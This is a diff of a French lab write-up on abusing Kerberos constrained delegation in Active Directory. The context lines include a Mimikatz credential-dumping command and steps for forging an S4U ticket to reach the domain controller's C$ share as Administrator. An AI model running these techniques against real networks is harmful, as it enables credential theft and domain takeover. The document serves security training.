@@ -70,9 +70,9 @@ Les SPNs étant interchangeables (partie non chiffrée du ticket de service), il
 
 # Exploitation  
 
-Comme vu dans d'autres labs, il sera nécessaire au préalable de compiler Rubeus (depuis ```C:\tools\Rubeus\Rubeus-master```, lancer le projet, ```Build -> Build Solution```).  
+Il sera nécessaire au préalable de compiler Rubeus (depuis le repo [Rubeus](https://github.com/GhostPack/Rubeus), lancer le projet, ```Build -> Build Solution```).  
 
-On récupère les crédentials de la machine srv$ via une précédente privesc ou en simulant sa compromission (*SRV\vagrant:vagrant* est administrateur local) :  
+On suppose ici que la machine srv$ a été préalablement compromise et on récupère ses crédentials :  
 ```cmd
 C:\tools> C:\tools\Mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
 
@@ -117,7 +117,7 @@ SID               : S-1-5-90-0-2
 
 Maintenant il nous faut dérouler les S4U pour générer un ticket de service, non pas pour *TIME/DC*, mais pour *CIFS/DC* pour l'utilisateur **WINDOMAIN\Administrator**.  
 
-Faire un ```runas /user:WINDOMAIN\test cmd.exe``` (mdp => Bonjour123!).  
+Faire un ```runas /user:WINDOMAIN\unprivileged_user cmd.exe``` (Testez à partir d'un utilisateur compromis non privilégié).  
 
 ```
 C:\tools>dir \\DC\C$
